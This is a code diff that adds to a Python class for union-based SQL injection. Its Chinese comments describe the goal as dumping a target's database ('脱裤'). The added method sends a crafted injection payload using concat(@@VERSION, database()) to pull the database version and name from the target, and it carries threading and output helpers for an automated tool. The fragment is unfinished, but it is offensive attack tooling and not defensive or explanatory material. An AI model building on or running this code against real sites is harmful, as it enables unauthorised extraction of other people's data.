@@ -5,12 +5,58 @@
 import requests
 import re
 import pprint
+from myhttp import HTTP
 
+"""-----定义分隔符-----"""
+Global_spilt = "'!@Aa@!'"
+"""-----定义分隔符-----"""
 pp = pprint.PrettyPrinter()
 
 
-class InjUnion(object):
-    def __init__(self, Lock, Name):
+class InjUnion(HTTP):
+    _url = None
+
+    def Print(self, text):
+        self._lock.acquire()
+        print(f'>>{self._threadname} 联合脱裤：{text}')
+        self._lock.release()
+        pass
+
+    def _db_init(self) -> bool:
+        """
+        函数：用于脱裤-系统数据库
+
+        :return: T/F=返回是否脱裤成功
+        """
+        if self._url is None:
+            return False
+
+        # 脱裤_数据库版本
+        url = self._url % 'concat({0},@@VERSION,{0},database(),char(126))' \
+            .format(Global_spilt)
+        self.GET_RE(url, '', self._lock)
+
+        return False
+        pass
+
+    def __init__(self, Lock, Name: str, Info: dict):
+        """
+        构造函数：初始化联合注入类
+
+        :param Lock: 线程锁
+        :param Name: 线程名
+        :param Info: 传入的信息字典
+        """
+        if '脱裤' in Info:
+            return
+        Info['脱裤'] = {'数据库': {}}
+        self._db = {'数据库': {}}
+
+        self._lock = Lock
+        self._threadname = Name
+        self._url = Info['注入方式']['基于联合注入']
+        self._db = Info['脱裤']
+        self._db_init()
         pass
 
     pass
